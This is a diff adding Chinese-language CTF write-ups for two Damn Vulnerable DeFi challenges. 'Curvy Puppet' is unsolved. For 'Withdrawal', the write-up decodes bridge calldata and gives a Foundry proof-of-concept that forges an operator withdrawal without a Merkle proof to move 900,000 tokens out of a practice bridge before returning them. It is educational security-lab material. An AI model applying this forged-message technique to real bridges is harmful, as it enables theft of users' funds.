@@ -1163,3 +1163,155 @@ contract Exploit {
     }
 }
 ```
+
+### Curvy Puppet (還沒解完)
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/curvy-puppet/): 這裡有一個借貸合約，任何人都可以從 Curve 的 stETH/ETH 池中借出 LP 代幣。為了這麼做，借款人必須首先存入足夠的 Damn Valuable 代幣 (DVT) 作為抵押。如果借款頭寸的價值超過了抵押品的價值，任何人都可以透過償還債務並奪取所有抵押品來清算它。該借貸合約整合了 Permit2 來安全管理代幣授權。它還使用了一個受限的價格預言機來獲取 ETH 和 DVT 的當前價格。Alice、Bob 和 Charlie 都在借貸合約中開立了頭寸。為了格外安全，他們決定將頭寸大幅過度抵押。但他們真的安全嗎？這不是開發者收到的緊急漏洞報告中所聲稱的。在使用者資金被奪走之前，關閉所有頭寸並取回所有可用的抵押品。
+
+開發者已經提供了部分庫存資金以備你在操作中需要使用：200 WETH 和略超過 6 個 LP 代幣。不用擔心利潤，但不要耗盡他們的資金。另外，請確保將任何救回的資產轉移到庫存賬戶。
+注意：此挑戰需要一個有效的 RPC URL，以將主網狀態分叉到你的本地環境。
+
+過關條件:
+- 所有用戶的部位都被清算
+- Treasury 仍有剩餘資金
+- Player 餘額為0
+
+知識點:
+-   read only reentrancy
+
+解題:
+- 卡關, 晚點再回來繼續解
+    
+### Withdrawal
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/withdrawal/): 
+有一個代幣橋用來將 Damn Valuable Tokens (DVT) 從 L2 提領到 L1，該橋上有一百萬 DVT 代幣的餘額。L1 端的代幣橋允許任何人在延遲期過後，並且提供有效的默克爾證明時，完成提領。該證明必須與代幣橋所有者設定的最新提領根對應。你收到了一個包含 4 筆在 L2 發起的提領的事件日誌的 JSON 檔案。這些提領可以在 7 天延遲期過後執行。但其中有一筆可疑的提領，不是嗎？你可能需要仔細檢查，因為所有資金可能都處於風險之中。幸運的是，你是一名具有特殊權限的橋樑操作員。透過完成所有給定的提領，防止可疑的那一筆執行，並且確保不會耗盡所有資金來保護這座橋樑。
+
+過關條件:
+- L1 Token Bridge 保留大部分的代幣至少是 99%
+- Player 地址的代幣餘額必須為 0
+- L1 Gateway 的 counter() 值必須大於或等於 WITHDRAWALS_AMOUNT，表示足夠多的提領已完成。
+- 以下四個提領的 ID 必須都已被標記為完成：
+hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"（第一筆提領）
+hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"（第二筆提領）
+hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"（第三筆提領）
+hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"（第四筆提領）
+
+知識點:
+-  跨鏈交易 L2 -> L1
+    -  L2Handler.sendMessage：在 L2 上，L2Handler 發送跨鏈訊息
+    -  L1Forwarder.forwardMessage：在 L1 上，L1Forwarder 轉發訊息
+    -  L1Gateway.finalizeWithdrawal：L1Gateway 確認提領，完成跨鏈操作
+    -  TokenBridge.executeTokenWithdrawal：TokenBridge 執行代幣轉移，將代幣發送給接收者。
+-  Calldata decode
+
+解題:
+- 題目給了 withdrawals.json, 裡面是 MessageStored L2 打到L1的4筆log.
+MessageStored的 event signature 是 0x43738d03
+透過 keccak256("MessageStored(bytes32,uint256,address,address,uint256,bytes)") 前4bytes得到的.
+- 再來要decode一下data. 看看裡面有什麼操作
+
+```
+eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id
+0000000000000000000000000000000000000000000000000000000066729b63 // timestamp
+0000000000000000000000000000000000000000000000000000000000000060 // data.offset
+0000000000000000000000000000000000000000000000000000000000000104 // data.length
+01210a38                                                         // L1Forwarder.forwardMessage.selector
+0000000000000000000000000000000000000000000000000000000000000000 // L2Handler.nonce
+000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender
+0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target (l1TokenBridge)
+0000000000000000000000000000000000000000000000000000000000000080 // message.offset
+0000000000000000000000000000000000000000000000000000000000000044 // message.length
+81191e51                                                         // TokenBridge.executeTokenWithdrawal.selector
+000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver
+0000000000000000000000000000000000000000000000008ac7230489e80000 // amount (10e18)
+0000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000
+```
+- L1Gateway.finalizeWithdrawal 如果是 Operator 不檢查 MerkleProof. 而且 player 有 Operator role. 這邊就可以偽造請求. 來把 token bridge的代幣提走, 我們可以先搶救  900000. 
+- 過關條件還要把withdrawals.json裡面的4筆交易狀態需要是finalized, 所以要把這4筆透過 L1Gateway.finalizeWithdrawal 發送一次. 因為我們先搶救了 900000 儘管4筆請求的第3筆轉移資產 999000 會造成轉帳失敗, 但是這個沒有在狀態檢查內, 導致整的交易不會被revert.
+![Screenshot 2024-09-06 at 3.35.56 PM](https://hackmd.io/_uploads/H1Oy-NO3A.png)
+ 
+- 最後再把救援的token,還給tokenBridge.
+- 
+[POC](./damn-vulnerable-defi/test/withdrawal/Withdrawal.t.sol) :
+
+```
+    function test_withdrawal() public checkSolvedByPlayer {
+
+        // fake withdrawal operation and obtain tokens
+        bytes memory message = abi.encodeCall(
+            L1Forwarder.forwardMessage,
+            (
+                0, // nonce
+                address(0), //  
+                address(l1TokenBridge), // target
+                abi.encodeCall( // message
+                    TokenBridge.executeTokenWithdrawal,
+                    (
+                        player, // deployer receiver
+                        900_000e18 //rescue 900_000e18
+                    )
+                )
+            )
+        );
+
+        l1Gateway.finalizeWithdrawal(
+            0, // nonce
+            l2Handler, // pretend l2Handler 
+            address(l1Forwarder), // target is l1Forwarder
+            block.timestamp - 7 days, // to pass 7 days waiting peroid
+            message, 
+            new bytes32[](0)   
+        );
+
+        // Perform finalizedWithdrawals due to we are operator, don't need to provide merkleproof.
+        
+        vm.warp(1718786915 + 8 days);
+        // first finalizeWithdrawal
+        l1Gateway.finalizeWithdrawal(
+            0, // nonce 0
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718786915, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
+            new bytes32[](0)    // Merkle proof
+        );
+
+        // second finalizeWithdrawal
+        l1Gateway.finalizeWithdrawal(
+            1, // nonce 1
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718786965, // timestamp
+            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
+            new bytes32[](0)    // Merkle proof
+        );
+
+        // third finalizeWithdrawal
+        l1Gateway.finalizeWithdrawal(
+            2, // nonce 2
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718787050, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // message
+            new bytes32[](0)    // Merkle proof
+        );
+
+        // fourth finalizeWithdrawal
+        l1Gateway.finalizeWithdrawal(
+            3, // nonce 3
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718787127, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
+            new bytes32[](0)    // Merkle proof
+        );
+ 
+        token.transfer(address(l1TokenBridge),900_000e18);
+        console.log("token.balanceOf(address(l1TokenBridge)",token.balanceOf(address(l1TokenBridge)));
+        
+    }
+    
+```
+
